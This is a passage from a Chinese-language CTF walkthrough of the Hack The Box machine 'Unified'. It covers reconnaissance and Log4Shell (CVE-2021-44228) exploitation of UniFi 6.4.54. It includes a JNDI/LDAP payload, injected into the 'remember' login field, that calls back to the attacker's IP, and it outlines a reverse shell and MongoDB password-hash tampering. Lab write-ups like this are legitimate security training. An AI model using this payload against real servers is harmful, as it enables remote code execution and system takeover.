# Unified

### 前言

本篇WP探究在一个名为“UniFi”的网络应用监视系统中利用Log4j的影响。本次靶机会向您展示为利用Log4j漏洞，如何去建立和安装所需的软件包和工具。之后，我们会操纵一个名为remember的请求头来进行反弹shell。同时，靶机上还有一个MongoDb实例，通过修改保存在实例中的hash值，就可以改变管理员的密码，然后我们就可以访问管理员登陆面板了。最后，通过面板的信息泄露得到管理员的SSH密码。

### 信息收集

第一步是用Nmap扫描目标IP，并查看哪个端口是开放的。以下是Nmap各项参数项的简单解释：

```
-sC：使用默认的脚本集进行脚本扫描，等价于 --script=default
-sV：版本探测
-V：提升详细等级，这会使得Nmap在扫描过程中打印更多信息。
```

![](<../../../.gitbook/assets/image (9).png>)

扫描显示8080端口正运行着一个HTTP代理，该代理看起来会将请求重定向到8443端口，而8443端口应该是一个SSL web服务器。更具体地说，我们发现8443端口默认页面的HTTP标题是“UniFI Network”。

使用浏览器访问一下该页面，出现了一个“UniFI”登录页面，版本号是6.4.54，具体如下图所示：

![](<../../../.gitbook/assets/image (10).png>)

给出了软件名、软件版本号，那么我们比较好的思路就是用搜索引擎查询一下有无相关的漏洞存在。

谷歌搜索：UniFy 6.4.54 exploit。发现有一篇文章详细地谈论了和UniFy有关的一个漏洞，具体编号是CVE-2021-44228。该漏洞具体和Log4j有关，下面我们简要说明一下Log4j。

> 如果你想进一步学习Log4j漏洞，建议你参看[此篇](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation)文章。

![](<../../../.gitbook/assets/image (7).png>)

我们可通过注入操作系统命令来利用Log4J漏洞。Log4J漏洞是一种web安全漏洞，允许攻击者在运行着Log4J应用的服务器上执行任意的操作系统命令。通常情况下，通过利用Log4J漏洞，攻击者可以完全接管应用程序及其所有数据。

为了确定靶机是否存在Log4J漏洞，我们首先需要向 /api/login 处发送一个POST请求，随后使用类似于BurpSuite这样的工具拦截该请求并编辑请求注入Log4J的payload。如果你不知道如何拦截并修改web请求，可以参看[此处](https://academy.hackthebox.com/module/details/110)。

> 利用FoxyProxy可以便捷地将浏览器发送的请求传递给Burp

![](<../../../.gitbook/assets/image (11).png>)

首先，我们在登录页面随便输入一个账号密码然后点击提交，这时候会发起一个web请求，我们用burp拦截该请求。

在我们修改请求之前，可以先将该请求发送到Burp的Repeater模块，该操作对应的快捷键是CTRL+R。

### 漏洞利用

之前谷歌出来的文章告诉我们，需要将payload注入到remember参数中。因为POST的数据是通过JSON发送的，并且payload包含花括号，所以为了预防payload被解释成JSON对象，我们需要用双引号把payload闭合起来，这样它就是一个字符串了。

![](<../../../.gitbook/assets/image (8).png>)

如上图所示，将payload注入remember字段，若服务器回连到我们，那么就可以确认靶机存在漏洞。

```java
${jndi:ldap://{Tun0 IP Address}/whatever}
```

JNDI的全称是Java Naming and Directory Interface API。通过调用该API，应用程序可以定位到资源和其他程序对象。资源就是一个提供了到系统的连接的程序对象，比如数据库服务器和消息系统。

LDAP的
